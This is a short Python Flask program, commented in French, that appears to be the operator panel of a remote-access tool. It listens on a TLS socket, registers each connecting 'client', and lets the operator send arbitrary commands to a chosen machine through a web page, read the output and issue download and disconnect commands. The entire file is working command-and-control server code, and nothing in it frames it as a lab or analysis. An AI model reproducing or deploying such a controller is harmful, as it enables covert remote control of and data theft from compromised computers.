from flask import Flask, render_template, request, redirect, url_for
import socket
import threading
import time  
import ssl

#création de l'appli Flask
app = Flask(__name__)

clients = []
client_lock = threading.Lock()
selected_client = {}

#config socket
HOST = '0.0.0.0'
PORT = 12345

def create_socket():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    time.sleep(1)
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"[+] Serveur Flask en attente de connexions sur {HOST}:{PORT}")

    return context.wrap_socket(s, server_side=True)

def accept_clients(server_socket):
    client_id = 1
    while True:
        sock, addr = server_socket.accept()
        with client_lock:
            clients.append({"id": client_id, "sock": sock, "addr": addr, "history": []})
        print(f"[+] Client {client_id} connecté depuis {addr}")
        client_id += 1

@app.route('/')
def index():
    with client_lock:
        connected_clients = [
            {"id": c["id"], "addr": f"{c['addr'][0]}:{c['addr'][1]}"} for c in clients
        ]
    return render_template('index.html', clients=connected_clients)

@app.route('/client/<int:client_id>', methods=['GET', 'POST'])
def control_client(client_id):
    with client_lock:
        client = next((c for c in clients if c['id'] == client_id), None)

    if not client:
        return f"Client {client_id} non trouvé", 404

    response = ""
    if request.method == 'POST':
        command = request.form['command']
        try:
            client['sock'].send(command.encode())
            if command.startswith("download"):
                response = "[!] Commande de téléchargement lancée (non gérée côté web)"
            else:
                data = client['sock'].recv(4096).decode()
                response = data.strip()
            client['history'].append((command, response))
        except Exception as e:
            response = f"Erreur: {e}"
            client['history'].append((command, response))

    return render_template('control.html', client=client)

@app.route('/client/<int:client_id>/disconnect')
def disconnect_client(client_id):
    with client_lock:
        client = next((c for c in clients if c['id'] == client_id), None)
        if client:
            try:
                client['sock'].send(b"disconnect")
                client['sock'].close()
            except:
                pass
            clients.remove(client)
    return redirect(url_for('index'))

if __name__ == '__main__':
    server_socket = create_socket()
    threading.Thread(target=accept_clients, args=(server_socket,), daemon=True).start()
    app.run(debug=False, host='127.0.0.1', port=5000)
